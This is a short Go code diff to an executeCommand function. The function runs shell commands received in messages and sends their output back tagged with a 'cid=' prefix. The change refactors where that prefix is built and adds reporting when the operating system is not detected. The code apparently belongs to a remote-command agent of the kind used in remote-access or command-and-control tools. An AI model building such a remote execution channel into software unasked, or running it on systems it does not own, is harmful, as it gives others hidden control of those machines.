@@ -146,6 +146,8 @@ func msgManager(msg string){
 
 func executeCommand(msg string){
 
+	var prefix = "cid=" + translateCodesList("exec") + "," // prefix for answer
+
 	var splitted_msg []string = splitCid(msg)
 	if len(splitted_msg) >= 2 {
 		command := strings.Join(splitted_msg[1:], ",")
@@ -162,12 +164,11 @@ func executeCommand(msg string){
 			executable_name = "cmd"
 			command_arg = "/c"
 		} else {
-			println("OS Not Detected")
+			msgManager(prefix + "OS Not Detected")
+			return
 		}
 
 		out, err := exec.Command(executable_name, command_arg, command).Output()
-
-		var prefix = "cid=" + translateCodesList("exec") + ","
 
 		if err != nil {
 			msgManager(prefix + err.Error())
